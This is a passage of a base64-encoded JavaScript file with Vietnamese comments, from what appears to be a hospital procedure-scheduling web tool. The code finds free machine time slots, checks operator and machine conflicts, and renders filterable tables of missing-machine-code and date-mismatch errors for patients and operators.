RhdGUpIHsNCiAgICAgICAgICAgICAgICBhbGxQcm9jcy5wdXNoKHByb2MpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9KTsNCiAgICB9DQogICAgDQogICAgcmV0dXJuIGFsbFByb2NzOw0KfQ0KDQovLyBIw6BtIHTDrG0ga2h1bmcgZ2nhu50gdHLhu5FuZyBjaG8gbcOheQ0KZnVuY3Rpb24gZmluZEF2YWlsYWJsZU1hY2hpbmVTbG90cyhzdGFydFRpbWUsIGVuZFRpbWUsIGR1cmF0aW9uLCBtYWNoaW5lUHJvY2VkdXJlcywgY29uZmxpY3RQcm9jZWR1cmVzLCBtYXhTbG90cywgb3BlcmF0b3IsIGRhdGUpIHsNCiAgICBjb25zdCBzbG90cyA9IFtdOw0KICAgIGxldCBjdXJyZW50VGltZSA9IHN0YXJ0VGltZTsNCiAgICANCiAgICB3aGlsZSAoY3VycmVudFRpbWUgKyBkdXJhdGlvbiA8PSBlbmRUaW1lICYmIHNsb3RzLmxlbmd0aCA8IG1heFNsb3RzKSB7DQogICAgICAgIGlmICghaGFzTWFjaGluZVRpbWVDb25mbGljdChjdXJyZW50VGltZSwgZHVyYXRpb24sIG1hY2hpbmVQcm9jZWR1cmVzLCBjb25mbGljdFByb2NlZHVyZXMsIG9wZXJhdG9yLCBkYXRlKSkgew0KICAgICAgICAgICAgc2xvdHMucHVzaCh7DQogICAgICAgICAgICAgICAgc3RhcnQ6IHNlY29uZHNUb1RpbWVTdHIoY3VycmVudFRpbWUpLA0KICAgICAgICAgICAgICAgIGVuZDogc2Vjb25kc1RvVGltZVN0cihjdXJyZW50VGltZSArIGR1cmF0aW9uKQ0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCiAgICAgICAgY3VycmVudFRpbWUgKz0gMTUgKiA2MDsgLy8gS2nhu4NtIHRyYSBt4buXaSAxNSBwaMO6dA0KICAgIH0NCiAgICANCiAgICByZXR1cm4gc2xvdHM7DQp9DQoNCi8vIEjDoG0ga2nhu4NtIHRyYSB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbiBjaG8gbcOheQ0KZnVuY3Rpb24gaGFzTWFjaGluZVRpbWVDb25mbGljdChzdGFydFRpbWUsIGR1cmF0aW9uLCBtYWNoaW5lUHJvY2VkdXJlcywgY29uZmxpY3RQcm9jZWR1cmVzLCBvcGVyYXRvciwgZGF0ZSkgew0KICAgIGNvbnN0IGVuZFRpbWUgPSBzdGFydFRpbWUgKyBkdXJhdGlvbjsNCiAgICANCiAgICAvLyBLaeG7g20gdHJhIHh1bmcgxJHhu5l0IG3DoXkNCiAgICBmb3IgKGNvbnN0IHByb2Mgb2YgbWFjaGluZVByb2NlZHVyZXMpIHsNCiAgICAgICAgaWYgKHByb2Muc3RhcnQgPCBlbmRUaW1lICYmIHByb2MuZW5kID4gc3RhcnRUaW1lKSB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICAvLyBLaeG7g20gdHJhIHh1bmcgxJHhu5l0IG5nxrDhu51pIHRo4buxYyBoaeG7h24NCiAgICBpZiAod2luZG93LmFsbFByb2NlZHVyZXMpIHsNCiAgICAgICAgY29uc3Qgb3BlcmF0b3JQcm9jZWR1cmVzID0gd2luZG93LmFsbFByb2NlZHVyZXMuZmlsdGVyKHAgPT4gDQogICAgICAgICAgICBwLm9wZXJhdG9yID09PSBvcGVyYXRvciAmJiANCiAgICAgICAgICAgIHAuZGF0ZSA9PT0gZGF0ZSAmJg0KICAgICAgICAgICAgIWNvbmZsaWN0UHJvY2VkdXJlcy5pbmNsdWRlcyhwKQ0KICAgICAgICApOw0KICAgICAgICANCiAgICAgICAgZm9yIChjb25zdCBwcm9jIG9mIG9wZXJhdG9yUHJvY2VkdXJlcykgew0KICAgICAgICAgICAgY29uc3QgcHJvY1N0YXJ0ID0gcHJvYy5zdGFydDsNCiAgICAgICAgICAgIGNvbnN0IHByb2NFbmQgPSBwcm9jLmVuZCArIChwcm9jLnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoKHN0YXJ0VGltZSA+PSBwcm9jU3RhcnQgJiYgc3RhcnRUaW1lIDwgcHJvY0VuZCkgfHwgDQogICAgICAgICAgICAgICAgKGVuZFRpbWUgPiBwcm9jU3RhcnQgJiYgZW5kVGltZSA8PSBwcm9jRW5kKSB8fA0KICAgICAgICAgICAgICAgIChzdGFydFRpbWUgPD0gcHJvY1N0YXJ0ICYmIGVuZFRpbWUgPj0gcHJvY0VuZCkpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICByZXR1cm4gZmFsc2U7DQp9DQoNCi8vIEjDoG0gY+G6rXAgbmjhuq10IFVJIGfhu6NpIMO9DQovLyBIw6BtIGPhuq1wIG5o4bqtdCBVSSBn4bujaSDDvQ0KZnVuY3Rpb24gdXBkYXRlTWFjaGluZVN1Z2dlc3Rpb25VSShtYWNoaW5lQ29kZSwgZGF0ZSwgcHJvY2VkdXJlcykgew0KICAgIGNvbnN0IHN1Z2dlc3Rpb25DZWxsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoYG1hY2hpbmVTdWdnZXN0aW9uLSR7bWFjaGluZUNvZGV9LSR7ZGF0ZX1gKTsNCiAgICBpZiAoc3VnZ2VzdGlvbkNlbGwpIHsNCiAgICAgICAgLy8gTOG6pXkgZ+G7o2kgw70gdOG7qyB0aOG7pyB0aHXhuq10IMSR4bqndSB0acOqbiAodsOsIHThuqV0IGPhuqMgxJHhu4F1IGdp4buRbmcgbmhhdSkNCiAgICAgICAgY29uc3QgZmlyc3RQcm9jID0gcHJvY2VkdXJlc1swXTsNCiAgICAgICAgaWYgKGZpcnN0UHJvYyAmJiBmaXJzdFByb2MubWFjaGluZVN1Z2dlc3Rpb24pIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25DZWxsLmlubmVySFRNTCA9IGZpcnN0UHJvYy5tYWNoaW5lU3VnZ2VzdGlvbjsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25DZWxsLmlubmVySFRNTCA9ICc8c3BhbiBjbGFzcz0ibm8tc3VnZ2VzdGlvbiI+S2jDtG5nIGPDsyBraHVuZyBnaeG7nSB0cuG7kW5nPC9zcGFuPic7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCg0KDQoNCg0KLy8gSMOgbSBoaeG7g24gdGjhu4sgbOG7l2kgcXXDqm4gZ+G6r24gbcOjIG3DoXkNCmZ1bmN0aW9uIGRpc3BsYXlNaXNzaW5nTWFjaGluZUVycm9ycygpIHsNCiAgICBjb25zdCBtaXNzaW5nTWFjaGluZUxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZUxvZycpOw0KICAgIGNvbnN0IG1pc3NpbmdNYWNoaW5lU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZVNlY3Rpb24nKTsNCiAgICBpZiAobWlzc2luZ01hY2hpbmVMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1pc3NpbmdNYWNoaW5lTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIHF1w6puIGfhuq9uIG3DoyBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICBtaXNzaW5nTWFjaGluZVNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgZG9jdG9yQ29sdW1uU3R5bGUgPSBzaG93RG9jdG9yID8gJycgOiAnZGlzcGxheTpub25lJzsNCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgbWlzc2luZ01hY2hpbmVMb2cuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7ZXJyb3IuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGF0ZX08YnIvPiR7ZXJyb3Iuc3RhcnRUaW1lfSDihpIgJHtlcnJvci5lbmRUaW1lfTwvY2VudGVyPjwvdGQ+DQogICAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBtaXNzaW5nTWFjaGluZUxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgIG1pc3NpbmdNYWNoaW5lU2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMNCiAgICB1cGRhdGVNaXNzaW5nTWFjaGluZU9wZXJhdG9yRmlsdGVyKCk7DQp9DQoNCi8vIEPhuq1wIG5o4bqtdCBkcm9wZG93biBs4buNYyBjaG8gcXXDqm4gZ+G6r24gbcOjIG3DoXkNCmZ1bmN0aW9uIHVwZGF0ZU1pc3NpbmdNYWNoaW5lT3BlcmF0b3JGaWx0ZXIoKSB7DQogICAgY29uc3Qgb3BlcmF0b3JzID0gWy4uLm5ldyBTZXQobWlzc2luZ01hY2hpbmVMb2cubWFwKGVycm9yID0+IGVycm9yLm9wZXJhdG9yKSldOw0KICAgIGNvbnN0IG9wZXJhdG9yU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21pc3NpbmdNYWNoaW5lT3BlcmF0b3JTZWxlY3QnKTsNCiAgICBvcGVyYXRvclNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArIA0KICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWlzc2luZ01hY2hpbmVPcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSBvcGVyYXRvcnMubGVuZ3RoID4gMCA/ICdibG9jaycgOiAnbm9uZSc7DQp9DQoNCi8vIEzhu41jIHF1w6puIGfhuq9uIG3DoyBtw6F5IHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbg0KZnVuY3Rpb24gZmlsdGVyTWlzc2luZ01hY2hpbmVCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21pc3NpbmdNYWNoaW5lT3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCiAgICBjb25zdCBmaWx0ZXJlZEVycm9ycyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBtaXNzaW5nTWFjaGluZUxvZyANCiAgICAgICAgOiBtaXNzaW5nTWFjaGluZUxvZy5maWx0ZXIoZXJyb3IgPT4gZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpKTsNCiAgICANCiAgICBkaXNwbGF5RmlsdGVyZWRNaXNzaW5nTWFjaGluZUVycm9ycyhmaWx0ZXJlZEVycm9ycyk7DQp9DQoNCi8vIEhp4buDbiB0aOG7iyBs4buXaSBxdcOqbiBn4bqvbiBtw6MgbcOheSDEkcOjIGzhu41jDQpmdW5jdGlvbiBkaXNwbGF5RmlsdGVyZWRNaXNzaW5nTWFjaGluZUVycm9ycyhmaWx0ZXJlZEVycm9ycykgew0KICAgIGNvbnN0IG1pc3NpbmdNYWNoaW5lTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21pc3NpbmdNYWNoaW5lTG9nJyk7DQogICAgIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBkb2N0b3JDb2x1bW5TdHlsZSA9IHNob3dEb2N0b3IgPyAnJyA6ICdkaXNwbGF5Om5vbmUnOw0KICAgIGlmIChmaWx0ZXJlZEVycm9ycy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgbWlzc2luZ01hY2hpbmVMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgcXXDqm4gZ+G6r24gbcOjIG3DoXkgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCgkJCQk8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQogICAgDQogICAgZmlsdGVyZWRFcnJvcnMuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnByb2NlZHVyZX08L3RkPg0KCQkJPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7ZXJyb3IuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGF0ZX08YnIvPiR7ZXJyb3Iuc3RhcnRUaW1lfSDihpIgJHtlcnJvci5lbmRUaW1lfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICANCiAgICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1pc3NpbmdNYWNoaW5lTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQp9DQoNCg0KLy8vaMOgbSBoaeG7g24gdGjhu4sgbmfDoHkgdGjhu7FjIGhp4buHbiBraMOhYyAvLy8NCi8vIEjDoG0gaGnhu4NuIHRo4buLIGzhu5dpIGRhdGUgbWlzbWF0Y2gNCmZ1bmN0aW9uIGRpc3BsYXlEYXRlTWlzbWF0Y2hFcnJvcnMoKSB7DQogICAgY29uc3QgZGF0ZU1pc21hdGNoTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGVNaXNtYXRjaExvZycpOw0KICAgIGNvbnN0IGRhdGVNaXNtYXRjaFNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGF0ZU1pc21hdGNoU2VjdGlvbicpOw0KICAgIA0KICAgIGlmIChkYXRlTWlzbWF0Y2hMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGRhdGVNaXNtYXRjaExvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSB0aOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3Uga2jDoWMgbmfDoHkgdGjhu7FjIGhp4buHbiBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgZGF0ZU1pc21hdGNoU2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBkb2N0b3JDb2x1bW5TdHlsZSA9IHNob3dEb2N0b3IgPyAnJyA6ICdkaXNwbGF5Om5vbmUnOw0KICAgIA0KICAgIGxldCBodG1sID0gYA0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICAgICAgPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNhbGVuZGFyLWFsdCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfDoHkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuIGLhuq90IMSR4bqndTwvdGg+DQogICAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIGRhdGVNaXNtYXRjaExvZy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaHRtbCArPSBgDQogICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnBhdGllbnROYW1lfSBbPGZvbnQgY29sb3I9InJlZCI+JHtlcnJvci5wYXRpZW50QWdlfTwvZm9udD5dPGJyLz4ke2Vycm9yLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke2RvY3RvckNvbHVtblN0eWxlfSI+JHtlcnJvci5kb2N0b3IgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5wcm9jZWR1cmVEYXRlfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke2Vycm9yLnN0YXJ0RGF0ZX08YnIvPiR7ZXJyb3Iuc3RhcnRUaW1lfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfQ0KICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIGRhdGVNaXNtYXRjaExvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KICAgIGRhdGVNaXNtYXRjaFNlY3Rpb24uc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgDQogICAgLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jDQogICAgdXBkYXRlRGF0ZU1pc21hdGNoT3BlcmF0b3JGaWx0ZXIoKTsNCn0NCg0KLy8gQ+G6rXAgbmjhuq10IGRyb3Bkb3duIGzhu41jIGNobyBkYXRlIG1pc21hdGNoDQpmdW5jdGlvbiB1cGRhdGVEYXRlTWlzbWF0Y2hPcGVyYXRvckZpbHRlcigpIHsNCiAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChkYXRlTWlzbWF0Y2hMb2cubWFwKGVycm9yID0+IGVycm9yLm9wZXJhdG9yKSldOw0KICAgIGNvbnN0IG9wZXJhdG9yU2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGVNaXNtYXRjaE9wZXJhdG9yU2VsZWN0Jyk7DQogICAgDQogICAgb3BlcmF0b3JTZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKyANCiAgICAgICAgb3BlcmF0b3JzLm1hcChvcCA9PiBgPG9wdGlvbiB2YWx1ZT0iJHtvcH0iPiR7b3AucmVwbGFjZSgvLC9nLCAnJyl9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGVNaXNtYXRjaE9wZXJhdG9yRmlsdGVyJykuc3R5bGUuZGlzcGxheSA9IG9wZXJhdG9ycy5sZW5ndGggPiAwID8gJ2Jsb2NrJyA6ICdub25lJzsNCn0NCg0KLy8gTOG7jWMgZGF0ZSBtaXNtYXRjaCB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h24NCmZ1bmN0aW9uIGZpbHRlckRhdGVNaXNtYXRjaEJ5T3BlcmF0b3IoKSB7DQogICAgY29uc3Qgb3BlcmF0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGF0ZU1pc21hdGNoT3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCiAgICBjb25zdCBmaWx0ZXJlZEVycm9ycyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBkYXRlTWlzbWF0Y2hMb2cgDQogICAgICAgIDogZGF0ZU1pc21hdGNoTG9nLmZpbHRlcihlcnJvciA9PiBlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykpOw0KICAgIA0KICAgIGRpc3BsYXlGaWx0ZXJlZERhdGVNaXNtYXRjaEVycm9ycyhmaWx0ZXJlZEVycm9ycyk7DQp9DQoNCi8vIEhp4buDbiB0aOG7iyBs4buXaSBkYXRlIG1pc21hdGNoIMSRw6MgbOG7jWMNCmZ1bmN0aW9uIGRpc3BsYXlGaWx0ZXJlZERhdGVNaXNtYXRjaEVycm9ycyhmaWx0ZXJlZEVycm9ycykgew0KICAgIGNvbnN0IGRhdGVNaXNtYXRjaExvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkYXRlTWlzbWF0Y2hMb2cnKTsNCiAgICBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgZG9jdG9yQ29sdW1uU3R5bGUgPSBzaG93RG9jdG9yID8gJycgOiAnZGlzcGxheTpub25lJzsNCiAgICANCiAgICBpZiAoZmlsdGVyZWRFcnJvcnMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGRhdGVNaXNtYXRjaExvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyBs4buXaSB0aOG7nWkgZ2lhbiBi4bqvdCDEkeG6p3Uga2jDoWMgbmfDoHkgdGjhu7FjIGhp4buHbiBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3A+JzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiIgc3R5bGU9IiR7ZG9jdG9yQ29sdW1uU3R5bGV9Ij48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMg